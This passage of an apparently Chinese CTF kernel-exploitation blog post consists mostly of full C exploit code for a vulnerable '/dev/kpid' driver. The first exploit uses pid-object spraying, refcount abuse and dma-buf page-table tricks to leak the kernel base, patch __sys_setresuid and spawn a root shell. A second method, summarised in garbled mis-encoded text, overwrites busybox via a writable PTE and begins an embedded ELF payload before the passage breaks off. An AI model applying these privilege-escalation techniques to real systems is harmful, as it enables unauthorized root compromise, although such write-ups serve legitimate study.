class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     PUT_MAGIC               0x69003</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     SHOW_MAGIC              0x58002</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     FORK_MAGIC              0x47001</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     N_PID_SPRAY             40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     OBJS_PER_SLAB           32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     N_PID_DISCARD           15</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     N_MMAP_SPRAY            0x100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     PATCH_TARGET_OFFSET     0x96bfe</span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pidfd_open</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span>&#123;<br>    <span class="hljs-keyword">return</span> syscall(SYS_pidfd_open, pid, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kpid_clone</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, FORK_MAGIC, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kpid_show</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> *pid)</span>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, SHOW_MAGIC, pid);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kpid_put</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, PUT_MAGIC, <span class="hljs-number">0</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> fd_spray_cpu[N_PID_SPRAY];<br><span class="hljs-type">int</span> processes[N_PID_SPRAY];<br><span class="hljs-type">char</span> *spray_pages[N_MMAP_SPRAY];<br><span class="hljs-type">int</span> fd_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> fd_pipe_addref[<span class="hljs-number">0x10</span>][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> fd_pipe_sync[<span class="hljs-number">0x10</span>][<span class="hljs-number">2</span>];<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_un</span> <span class="hljs-title">unix_addr</span> =</span> &#123;<br>    .sun_family = AF_UNIX,<br>    .sun_path = <span class="hljs-string">&quot;/tmp/exploitsocket&quot;</span><br>&#125;;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add_refcount</span><span class="hljs-params">(<span class="hljs-type">int</span> count, <span class="hljs-type">int</span> listensock)</span> &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;count; i++)&#123;<br>        <span class="hljs-type">int</span> refsock = socket(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>);<br>        connect(refsock, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;unix_addr, <span class="hljs-keyword">sizeof</span>(unix_addr));<br>        accept(listensock, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    signal(SIGCHLD, SIG_IGN);<br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-type">int</span> listensock = socket(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    unlink(unix_addr.sun_path);<br>    bind(listensock, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;unix_addr, <span class="hljs-keyword">sizeof</span>(unix_addr));<br><br>    pipe(fd_pipe);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++)&#123;<br>        pipe(fd_pipe_addref[i]);<br>        pipe(fd_pipe_sync[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_MMAP_SPRAY; i++)&#123;<br>        spray_pages[i] = mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0xdead0000</span>UL + i*<span class="hljs-number">0x10000</span>UL,<br>                            <span class="hljs-number">0x10000</span>, PROT_READ | PROT_EXEC | PROT_WRITE,<br>                            MAP_ANONYMOUS | MAP_SHARED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(spray_pages[i] == MAP_FAILED)    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fail mmap %d.\n&quot;</span>, i);<br>    &#125;<br><br>    <span class="hljs-type">char</span> tmp = *(<span class="hljs-type">char</span> *)spray_pages[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-type">int</span> dmafd = creat(<span class="hljs-string">&quot;/dev/dma_heap/system&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span>(dmafd == <span class="hljs-number">-1</span>) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;DMA open fail.&quot;</span>);<br><br>    <span class="hljs-type">int</span> fd_dev = open(<span class="hljs-string">&quot;/dev/kpid&quot;</span>, O_RDWR);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_PID_SPRAY; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == N_PID_DISCARD)&#123;<br>            kpid_clone(fd_dev);<br>            kpid_show(fd_dev, &amp;processes[N_PID_DISCARD]);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-number">0</span> == processes[N_PID_DISCARD])&#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Child starts.&quot;</span>);<br>                <br>                <span class="hljs-type">char</span> tmp;<br>                read(fd_pipe[<span class="hljs-number">0</span>], &amp;tmp, <span class="hljs-number">1</span>);<br>                <br>                listen(listensock, <span class="hljs-number">0x1001</span>);<br>                sleep(<span class="hljs-number">100000</span>);<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Kpid: %d.\n&quot;</span>, processes[N_PID_DISCARD]);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;OBJS_PER_SLAB; j++)&#123;<br>            <span class="hljs-type">int</span> pid = fork();<br>            <span class="hljs-keyword">if</span>(pid)&#123;<br>                <span class="hljs-keyword">if</span>(j == <span class="hljs-number">0</span>)&#123;<br>                    processes[i] = pid;<br>                    fd_spray_cpu[i] = pidfd_open(pid, <span class="hljs-number">0</span>);<br>                    <span class="hljs-keyword">if</span>(fd_spray_cpu[i] &lt; <span class="hljs-number">0</span>)  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fail %d, %d\n&quot;</span>, i, j);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                sleep(<span class="hljs-number">10</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Spray over. Wait...&quot;</span>);<br><br>    sleep(<span class="hljs-number">15</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wait over.&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_PID_DISCARD; i++)&#123;<br>        close(fd_spray_cpu[i]);<br>    &#125;<br><br>    kpid_put(fd_dev);<br>    close(fd_spray_cpu[N_PID_DISCARD+<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_MMAP_SPRAY/<span class="hljs-number">2</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">0x10</span>; j++)&#123;<br>            *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(spray_pages[i]+j*<span class="hljs-number">0x1000</span>) = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)j;<br>            *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(spray_pages[i]+j*<span class="hljs-number">0x1000</span>+<span class="hljs-number">1</span>) = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)i;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">int</span> dma_buf_fd = <span class="hljs-number">-1</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_heap_allocation_data</span> <span class="hljs-title">data</span>;</span><br>    data.len = <span class="hljs-number">0x1000</span>;<br>    data.fd_flags = O_RDWR;<br>    data.heap_flags = <span class="hljs-number">0</span>;<br>    data.fd = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dma_buf_fd: %d\n&quot;</span>, dma_buf_fd = data.fd);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=N_MMAP_SPRAY/<span class="hljs-number">2</span>; i&lt;N_MMAP_SPRAY; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">0x10</span>; j++)&#123;<br>            *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(spray_pages[i]+j*<span class="hljs-number">0x1000</span>) = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)j;<br>            *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(spray_pages[i]+j*<span class="hljs-number">0x1000</span>+<span class="hljs-number">1</span>) = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)i;<br>        &#125;<br>    &#125;<br><br>    write(fd_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span>(fork())  <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">else</span>&#123;        <br>            <span class="hljs-keyword">if</span>(i != <span class="hljs-number">0</span>)  add_refcount(<span class="hljs-number">0x100</span>, listensock);<br>            <span class="hljs-keyword">else</span>        add_refcount(<span class="hljs-number">0xff</span>, listensock);<br>            write(fd_pipe_addref[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">1</span>);<br>            sleep(<span class="hljs-number">100000</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++)&#123;<br>        read(fd_pipe_addref[i][<span class="hljs-number">0</span>], &amp;tmp, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Add ref 1 finish.&quot;</span>);<br><br>    <span class="hljs-type">void</span> *target_page = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">bool</span> find = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_MMAP_SPRAY; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">0x10</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(<br>                *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(spray_pages[i]+j*<span class="hljs-number">0x1000</span>) != (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> )j<br>                || *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(spray_pages[i]+j*<span class="hljs-number">0x1000</span>+<span class="hljs-number">1</span>) != (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)i<br>            )&#123;<br>                target_page = spray_pages[i]+j*<span class="hljs-number">0x1000</span>;<br>                find = <span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(find)    <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(find)    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found target: 0x%llx.\n&quot;</span>, (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)target_page);<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Not found target.&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Remapping...&quot;</span>);<br>    munmap(target_page, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-type">void</span> *dmabuf = mmap(target_page, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_EXEC | PROT_WRITE,<br>                    MAP_SHARED | MAP_POPULATE, dma_buf_fd, <span class="hljs-number">0</span>);<br>    <br>    *(<span class="hljs-type">char</span> *)dmabuf = <span class="hljs-string">&#x27;0&#x27;</span>;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++)&#123;<br>        <span class="hljs-keyword">if</span>(fork())  <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">else</span>&#123;<br>            read(fd_pipe_sync[i][<span class="hljs-number">0</span>], &amp;tmp, <span class="hljs-number">1</span>);        <br>            add_refcount(<span class="hljs-number">0x100</span>, listensock);<br>            write(fd_pipe_addref[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">1</span>);<br>            sleep(<span class="hljs-number">100000</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++)&#123;<br>        write(fd_pipe_sync[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++)&#123;<br>        read(fd_pipe_addref[i][<span class="hljs-number">0</span>], &amp;tmp, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    sleep(<span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Add ref 2 finish.&quot;</span>);<br><br>    <span class="hljs-type">void</span> *victim_page = <span class="hljs-literal">NULL</span>;<br>    find = <span class="hljs-literal">false</span>;<br>    *(<span class="hljs-type">size_t</span> *)dmabuf = <span class="hljs-number">0x800000000009c067</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_MMAP_SPRAY; i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">0x10</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(spray_pages[i]+<span class="hljs-number">0x1000</span>*j == target_page)<br>                <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">if</span>(*(<span class="hljs-type">size_t</span> *)(spray_pages[i]+<span class="hljs-number">0x1000</span>*j) &gt; <span class="hljs-number">0xffff</span>)&#123;<br>                victim_page = spray_pages[i]+<span class="hljs-number">0x1000</span>*j;<br>                kernel_offset = (*(<span class="hljs-type">size_t</span> *)(spray_pages[i]+<span class="hljs-number">0x1000</span>*j)<span class="hljs-number">-0x1c04000</span>)&amp;~<span class="hljs-number">0xfff</span>;<br>                find = <span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(find)    <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(find)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found victim: 0x%llx.\n&quot;</span>, (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)victim_page);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Kernel offset: 0x%llx.\n&quot;</span>, (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)kernel_offset);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Not found victim.&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    *(<span class="hljs-type">size_t</span> *)dmabuf = (PATCH_TARGET_OFFSET+kernel_offset) &amp; ~<span class="hljs-number">0xfff</span> | <span class="hljs-number">0x67</span>;<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)((<span class="hljs-type">size_t</span>)victim_page + ((PATCH_TARGET_OFFSET + kernel_offset) &amp; <span class="hljs-number">0xfff</span>)) = <span class="hljs-number">0x85</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Overwrite __sys_setresuid...&quot;</span>);<br><br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    get_root_shell();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨æ–¹æ³•2"><a href="#åˆ©ç”¨æ–¹æ³•2" class="headerlink" title="åˆ©ç”¨æ–¹æ³•2"></a>åˆ©ç”¨æ–¹æ³•2</h1><p>æ¯”è¾ƒç®€å•çš„ä¸€ç§ï¼Œé€šè¿‡add timerå¢åŠ pid-&gt;countï¼Œä½¿PTEä»åªè¯»å˜ä¸ºå¯å†™ï¼Œæ”¹busybox</p><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     PUT_MAGIC       0x69003</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     SHOW_MAGIC      0x58002</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     FORK_MAGIC      0x47001</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     N_PID_SPRAY     40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     OBJS_PER_SLAB   32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     N_PID_DISCARD   15</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     N_MMAP_SPRAY    0x400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>     ADD_REF         0x42</span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pidfd_open</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span>&#123;<br>    <span class="hljs-keyword">return</span> syscall(SYS_pidfd_open, pid, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kpid_clone</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, FORK_MAGIC, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kpid_show</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> *pid)</span>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, SHOW_MAGIC, pid);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">kpid_put</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(fd, PUT_MAGIC, <span class="hljs-number">0</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> fd_spray_cpu[N_PID_SPRAY];<br><span class="hljs-type">int</span> processes[N_PID_SPRAY];<br><span class="hljs-type">char</span> *spray_pages[N_MMAP_SPRAY];<br><span class="hljs-type">int</span> fd_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">char</span> elfcode[] = &#123;<br>    <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span 